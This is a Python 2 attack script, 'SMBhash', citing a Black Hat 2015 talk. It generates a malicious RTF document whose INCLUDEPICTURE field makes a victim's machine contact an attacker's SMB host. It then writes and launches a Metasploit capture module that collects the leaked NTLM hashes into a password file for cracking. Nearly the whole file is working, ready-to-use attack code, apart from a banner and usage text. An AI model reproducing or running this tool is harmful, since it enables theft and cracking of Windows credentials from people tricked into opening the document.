import os
import sys
import time
from termcolor import colored
############################################################################################################################################################################################################################################
#This Script is based on SMB relay attack which was shown on BLACKHAT 2015 USA(Sharing-More-Than-Just-Your-Files.pdf)                                                                                                                      #
#Source Videos URL-https://www.youtube.com/watch?v=a1dgOO9bALA                                                                                                                                                                              #
#Source Video Presentation - https://www.blackhat.com/docs/us-15/materials/us-15-Brossard-SMBv2-Sharing-More-Than-Just-Your-Files.pdf                                                                                                      #
#This Script was working on SMB(server message Block) which is used for File sharing over LAN. So an SMB server can share the image over HTTP and remote user can authernticated with challenge response schenerio with the help of hashes.#
############################################################################################################################################################################################################################################
template = '{\\rtf1{\\field{\\*\\fldinst {INCLUDEPICTURE "file://[HOST]/[IMAGE]" \\\\* MERGEFORMAT\\\\d}}{\\fldrslt}}}'
msf_script_template = '''
use auxiliary/server/capture/smb
set SRVHOST [HOST]
set JOHNPWFILE passwords
run
'''

def generateMSFScript(host):
	script = open('metasploit.rc','w')
	script.write(msf_script_template.replace('[HOST]',host))
	script.close()
	print '[+] Script Generated Successfully [+]'
	

def runListener(host):
	generateMSFScript(host)
	print '[+] Running Metasploit Auxiliary Module [+]'
	os.system('msfconsole -q -r metasploit.rc')
	
	

def generateDocument(host,image):
	return template.replace('[HOST]',host).replace('[IMAGE]',image)

def writeDocument(content):
	filename = str(int(time.time())) + '.rtf'
	doc = open(filename,'w')
	doc.write(content)
	doc.close()
	print '[+] Generated malicious file: ' + filename + ' [+]'
	

def main():
	if(len(sys.argv) < 3):
		print '\nUsage : main.py IP IMAGENAME run_listener \n'
		print 'Example: main.py 127.0.0.1 hack.jpg 0\n' # will not run listener
		print 'Example: main.py 127.0.0.1 hack.jpg 1' # will  run listener
	else:
		host = sys.argv[1]
		image = sys.argv[2]
		run_msf = sys.argv[3]
		writeDocument(generateDocument(host,image))
		if(int(run_msf) == 1):
			runListener(host)
		
	
	print ' ########################## '       
        print '#        SMBhash           #'
        print '#        SMBhash           #'
        print '#        SMBhash           #'
        print ' ########################## '
        print colored('       Coded','red'), colored('By','white'), colored('D@nt3','green')
    
    
    
if __name__ == "__main__":
    main()

